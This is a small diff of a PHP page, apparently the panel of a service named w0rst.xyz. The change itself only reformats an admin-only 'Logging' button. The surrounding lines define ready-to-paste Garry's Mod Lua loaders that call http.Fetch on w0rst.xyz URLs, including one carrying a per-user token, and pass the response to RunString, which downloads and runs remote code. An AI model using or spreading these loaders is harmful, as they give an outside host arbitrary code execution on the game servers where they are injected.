@@ -25,7 +25,9 @@ $script = "http.Fetch('https://w0rst.xyz/project/func/load.lua', RunString)";
 $public = "http.Fetch('https://w0rst.xyz/project/func/napalm.php', RunString)";
 $private = "http.Fetch('https://w0rst.xyz/project/func/napalm.php?token=$token', RunString)";
 
-if($Local::IsAdmin()) { $Logs = "<button class='nav-button' onclick='redirect(4)'>Logging</button>"; }
+if($Local::IsAdmin()) { 
+    $Logs = "<button class='nav-button' onclick='redirect(4)'>Logging</button>"; 
+}
 
 ?>
 <div class="nav-container"> 
